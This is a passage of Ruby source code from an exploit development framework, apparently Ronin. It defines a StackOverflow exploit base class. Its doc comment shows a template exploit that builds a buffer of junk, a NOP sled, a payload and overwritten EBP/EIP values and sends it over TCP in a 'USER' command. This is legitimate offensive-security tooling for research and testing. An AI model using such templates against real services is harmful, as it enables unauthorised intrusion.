module Ronin
  module Exploits
    #
    # Represents a stack overflow exploit.
    #
    # ## Example
    #
    #     require 'ronin/exploits/stack_overflow'
    #     require 'ronin/exploits/mixins/remote_tcp'
    #
    #     module Ronin
    #       module Exploits
    #         class MyExploit < StackOverflow
    #
    #           register 'my_exploit'
    #
    #           include Mixins::RemoteTCP
    #
    #           def build
    #             ebp = 0x06eb9090
    #             eip = 0x1001ae86
    #
    #             @buffer = buffer_overflow(length: 1024, nops: 16, payload: payload, bp: ebp, ip: eip)
    #           end
    #
    #           def launch
    #             tcp_send "USER #{@buffer}"
    #           end
    #
    #         end
    #       end
    #     end
    #
    # If you want more control over how the buffer is constructed:
    #
    #     def build
    #       ebp = 0x06eb9090
    #       eip = 0x1001ae86
    #
    #       @buffer = junk(1024) + nops(16) + payload + stack_frame(ebp,eip)
    #     end
    #
    # @api public
    #
    # @since 1.0.0
    #
    class StackOverflow < MemoryCorruption

      include Mixins::StackOverflow

      #
      # Returns the type or kind of exploit.
      #
      # @return [Symbol]
      #
      # @note
      #   This is used internally to map an exploit class to a printable type.
      #
      # @api private
